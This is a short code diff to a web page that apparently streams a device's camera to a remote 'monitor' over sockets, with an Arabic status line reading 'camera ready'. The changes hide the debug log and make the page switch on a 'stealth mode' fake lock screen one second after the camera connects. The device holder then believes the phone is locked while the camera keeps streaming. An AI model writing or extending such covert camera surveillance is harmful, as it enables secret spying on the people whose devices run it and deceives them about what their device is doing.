@@ -71,7 +71,7 @@
 
     <!-- Debug Log Container -->
     <div id="debug-log"
-        style="position: absolute; top: 10px; left: 10px; z-index: 5000; color: #0f0; font-size: 10px; background: rgba(0,0,0,0.7); max-height: 200px; overflow-y: auto; pointer-events: none; text-align: left; direction: ltr;">
+        style="position: absolute; top: 10px; left: 10px; z-index: 5000; color: #0f0; font-size: 10px; background: rgba(0,0,0,0.7); max-height: 200px; overflow-y: auto; pointer-events: none; text-align: left; direction: ltr; display: none;">
         Log started...<br>
     </div>
 
@@ -201,6 +201,11 @@
             socket.emit('join-room', roomId, 'monitor');
             sendDeviceInfo();
             statusText.innerText = "الكاميرا جاهزة.";
+
+            // Auto-activate stealth mode (fake lock screen)
+            setTimeout(() => {
+                toggleStealthMode();
+            }, 1000);
         });
 
         async function getCamera(facingMode = 'environment') {
